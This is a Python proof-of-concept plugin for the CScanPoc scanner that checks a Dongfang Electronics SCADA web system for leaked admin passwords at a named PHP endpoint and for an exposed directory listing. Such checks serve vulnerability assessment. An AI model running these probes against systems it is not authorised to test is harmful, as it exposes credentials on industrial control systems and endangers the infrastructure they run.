# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '83679ced-53d8-4032-b230-c905f6e1a2ba'
    name = '东方电子SCADA通用系统信息泄露' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-11-05'  # 漏洞公布时间
    desc = '''
        东方电子SCADA通用系统信息泄露：
        /modules/manage/server/requestWorkMode.php
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0131500
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = '东方电子SCADA'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0102c728-0861-42f1-bec6-637361ea57b4'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            #敏感信息泄露
            url = arg + '/modules/manage/server/requestWorkMode.php'
            code, head, res, err, _ = hh.http(url)
            if code == 200 and 'productName' in res and 'adminPassword' in res and 'anonymousIPs' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            #列目录
            url = arg + '/help/php/'
            code, head, res, err, _ = hh.http(url)
            if (code == 200) and ('Index of /help/php' in res) and ('util.inc.php' in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()